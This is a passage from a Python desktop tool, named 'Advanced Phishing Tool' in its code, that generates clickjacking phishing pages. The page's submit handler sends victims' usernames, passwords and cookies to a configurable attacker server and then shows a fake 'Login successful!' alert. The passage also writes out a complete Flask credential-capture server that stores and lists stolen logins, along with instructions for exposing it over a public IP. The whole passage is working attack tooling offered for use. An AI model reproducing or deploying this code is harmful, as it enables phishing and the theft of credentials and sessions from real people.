                const x = e.clientX - offsetX;
                const y = e.clientY - offsetY;
                
                draggedElement.style.left = x + 'px';
                draggedElement.style.top = y + 'px';
                
                updatePositionDisplay(draggedElement);
                
                const elemId = draggedElement.getAttribute('data-elem-id');
                if (bridge && bridge.updatePosition) {{
                    bridge.updatePosition(elemId, Math.round(y), Math.round(x));
                }}
            }}
        }});
        
        document.addEventListener('mouseup', function() {{
            if (draggedElement) {{
                draggedElement.classList.remove('dragging');
                console.log('✓ Element dropped at:', {{
                    id: draggedElement.getAttribute('data-elem-id'),
                    top: draggedElement.style.top,
                    left: draggedElement.style.left
                }});
                draggedElement = null;
            }}
        }});
        
        function updatePositionDisplay(element) {{
            const elemId = element.getAttribute('data-elem-id');
            const top = parseInt(element.style.top);
            const left = parseInt(element.style.left);
            
            const posInfo = document.getElementById('current-pos');
            if (posInfo) {{
                posInfo.innerHTML = `<strong style="color: #4CAF50;">${{elemId}}</strong><br>Top: ${{top}}px | Left: ${{left}}px`;
            }}
        }}
        
        document.addEventListener('keydown', function(e) {{
            if (selectedElement && !e.target.matches('input, textarea')) {{
                const step = e.shiftKey ? 10 : 1;
                const currentTop = parseInt(selectedElement.style.top);
                const currentLeft = parseInt(selectedElement.style.left);
                
                let newTop = currentTop;
                let newLeft = currentLeft;
                
                switch(e.key) {{
                    case 'ArrowUp': 
                        newTop -= step; 
                        e.preventDefault(); 
                        break;
                    case 'ArrowDown': 
                        newTop += step; 
                        e.preventDefault(); 
                        break;
                    case 'ArrowLeft': 
                        newLeft -= step; 
                        e.preventDefault(); 
                        break;
                    case 'ArrowRight': 
                        newLeft += step; 
                        e.preventDefault(); 
                        break;
                }}
                
                if (newTop !== currentTop || newLeft !== currentLeft) {{
                    selectedElement.style.top = newTop + 'px';
                    selectedElement.style.left = newLeft + 'px';
                    updatePositionDisplay(selectedElement);
                    
                    const elemId = selectedElement.getAttribute('data-elem-id');
                    if (bridge && bridge.updatePosition) {{
                        bridge.updatePosition(elemId, newTop, newLeft);
                    }}
                }}
            }}
        }});
        
        function handleSubmit(event) {{
            {'event.preventDefault(); var username = document.getElementById("drag-username").value; var password = document.getElementById("drag-password").value; fetch("' + server_url + '", { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({username: username, password: password, url: window.location.href, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, cookies: document.cookie}), mode: "no-cors" }); alert("Login successful!"); return false;' if for_server else '''
            event.preventDefault();
            const formData = new FormData(event.target);
            let data = {};
            formData.forEach((value, key) => data[key] = value);
            
            console.log('📦 Captured Credentials:', data);
            alert('🎯 PREVIEW MODE\\n\\nCaptured Data:\\n\\n' + JSON.stringify(data, null, 2));
            return false;
            '''}
        }}
        
        console.log('✓ Clickjacking POC loaded');
    </script>
</body>
</html>'''
        
        return html
    
    def update_preview(self):
        """Update live preview"""
        if not self.target_url:
            return
        
        html = self.generate_html(for_server=False)
        self.web_view.setHtml(html, QUrl(self.target_url))
        self.code_view.setText(self.generate_html(for_server=True))
    
    def export_html(self):
        """Export to HTML file with iframe"""
        if not self.target_url:
            QMessageBox.warning(self, "Error", "Please load a target first")
            return
        
        file_path, _ = QFileDialog.getSaveFileName(
            self, "Save HTML File", "clickjacking_iframe.html", "HTML Files (*.html)"
        )
        
        if file_path:
            try:
                html = self.generate_html(for_server=True)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(html)
                QMessageBox.information(self, "Success", 
                    f"✓ HTML exported successfully!\n\n"
                    f"File: {file_path}\n\n"
                    f"Open it in a browser to test the attack.")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to export:\n{str(e)}")
    
    def copy_code(self):
        """Copy HTML to clipboard"""
        if not self.target_url:
            QMessageBox.warning(self, "Error", "Please load a target first")
            return
        
        html = self.generate_html(for_server=True)
        clipboard = QApplication.clipboard()
        clipboard.setText(html)
        QMessageBox.information(self, "Success", 
            "✓ HTML code copied to clipboard!\n\n"
            "Paste it into a .html file and open in browser.")
    
    def generate_server_code(self):
        """Generate server code for capturing credentials"""
        server_code = f'''#!/usr/bin/env python3
"""
Credential Capture Server
Captures credentials from phishing page
"""

from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime
import json
import os

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# File to store captured credentials
CAPTURE_FILE = 'captured_credentials.json'

@app.route('{self.capture_endpoint.text()}', methods=['GET', 'POST', 'OPTIONS'])
def capture():
    """Capture credentials from phishing page"""
    
    # Handle OPTIONS request for CORS
    if request.method == 'OPTIONS':
        return '', 200
    
    data = {{}}
    
    # Handle GET request (image beacon)
    if request.method == 'GET':
        data = {{
            'username': request.args.get('u', ''),
            'password': request.args.get('p', ''),
            'method': 'GET'
        }}
    
    # Handle POST request (main method)
    elif request.method == 'POST':
        if request.is_json:
            data = request.get_json()
        else:
            data = request.form.to_dict()
    
    # Add metadata
    data['timestamp'] = datetime.now().isoformat()
    data['ip'] = request.remote_addr
    data['user_agent'] = request.headers.get('User-Agent', '')
    data['referer'] = request.headers.get('Referer', '')
    
    # Save to file
    try:
        if os.path.exists(CAPTURE_FILE):
            with open(CAPTURE_FILE, 'r') as f:
                captures = json.load(f)
        else:
            captures = []
        
        captures.append(data)
        
        with open(CAPTURE_FILE, 'w') as f:
            json.dump(captures, f, indent=2)
        
        # Print to console
        print("\\n" + "="*60)
        print("🎯 CREDENTIAL CAPTURED!")
        print("="*60)
        print(f"Username: {{data.get('username', 'N/A')}}")
        print(f"Password: {{data.get('password', 'N/A')}}")
        print(f"IP: {{data.get('ip', 'N/A')}}")
        print(f"Time: {{data.get('timestamp', 'N/A')}}")
        print(f"User Agent: {{data.get('user_agent', 'N/A')}}")
        if 'cookies' in data:
            print(f"Cookies: {{data.get('cookies', 'N/A')}}")
        print("="*60 + "\\n")
        
    except Exception as e:
        print(f"Error saving: {{e}}")
    
    return jsonify({{'status': 'success'}}), 200

@app.route('/captured', methods=['GET'])
def view_captured():
    """View all captured credentials"""
    try:
        if os.path.exists(CAPTURE_FILE):
            with open(CAPTURE_FILE, 'r') as f:
                captures = json.load(f)
            return jsonify(captures), 200
        else:
            return jsonify([]), 200
    except Exception as e:
        return jsonify({{'error': str(e)}}), 500

@app.route('/stats', methods=['GET'])
def stats():
    """Get capture statistics"""
    try:
        if os.path.exists(CAPTURE_FILE):
            with open(CAPTURE_FILE, 'r') as f:
                captures = json.load(f)
            return jsonify({{
                'total_captures': len(captures),
                'unique_ips': len(set(c.get('ip', '') for c in captures)),
                'latest': captures[-1] if captures else None
            }}), 200
        else:
            return jsonify({{'total_captures': 0}}), 200
    except Exception as e:
        return jsonify({{'error': str(e)}}), 500

if __name__ == '__main__':
    print("="*60)
    print("🎯 CREDENTIAL CAPTURE SERVER")
    print("="*60)
    print(f"Listening on: http://0.0.0.0:8000")
    print(f"Capture endpoint: {self.capture_endpoint.text()}")
    print(f"View captures: http://localhost:8000/captured")
    print(f"Statistics: http://localhost:8000/stats")
    print(f"Saving to: {{CAPTURE_FILE}}")
    print("="*60)
    print("\\nWaiting for credentials...\\n")
    
    app.run(host='0.0.0.0', port=8000, debug=True)
'''
        
        self.server_view.setText(server_code)
        
        # Save to file
        try:
            with open('capture_server.py', 'w') as f:
                f.write(server_code)
            
            QMessageBox.information(self, "Server Code Generated", 
                "✅ Server code generated!\n\n" +
                "Saved to: capture_server.py\n\n" +
                "📋 SETUP INSTRUCTIONS:\n\n" +
                "1. Install requirements:\n" +
                "   pip install flask flask-cors\n\n" +
                "2. Run the server:\n" +
                "   python capture_server.py\n\n" +
                "3. Server will listen on port 8000\n\n" +
                "4. Credentials will be saved to:\n" +
                "   captured_credentials.json\n\n" +
                "5. View captures at:\n" +
                "   http://localhost:8000/captured\n\n" +
                "⚠️ For remote access, use your public IP\n" +
                "   and configure firewall/port forwarding")
        except Exception as e:
            QMessageBox.warning(self, "Warning", f"Could not save file:\n{str(e)}")
    
    def apply_dark_theme(self):
        """Apply dark theme"""
        self.setStyleSheet("""
            QMainWindow, QWidget {
                background-color: #2d2d2d;
                color: #ffffff;
            }
            QGroupBox {
                border: 2px solid #4CAF50;
                border-radius: 8px;
                margin-top: 10px;
                padding: 15px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
                color: #4CAF50;
            }
            QLineEdit, QSpinBox, QTextEdit {
                background-color: #3a3a3a;
                border: 1px solid #555;
                border-radius: 4px;
                padding: 8px;
                color: #ffffff;
            }
            QPushButton {
                background-color: #4CAF50;
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 5px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #45a049;
            }
            QCheckBox::indicator {
                width: 18px;
                height: 18px;
                border: 2px solid #4CAF50;
                border-radius: 3px;
            }
            QCheckBox::indicator:checked {
                background-color: #4CAF50;
            }
            QSlider::groove:horizontal {
                height: 8px;
                background: #3a3a3a;
                border-radius: 4px;
            }
            QSlider::handle:horizontal {
                background: #4CAF50;
                width: 18px;
                margin: -5px 0;
                border-radius: 9px;
            }
        """)

def main():
    app = QApplication(sys.argv)
    app.setApplicationName("Advanced Phishing Tool")
    
    tool = ClickjackingTool()
    tool.show()
    
    sys.exit(app.exec_())

if __name__ == '__main__':
    main()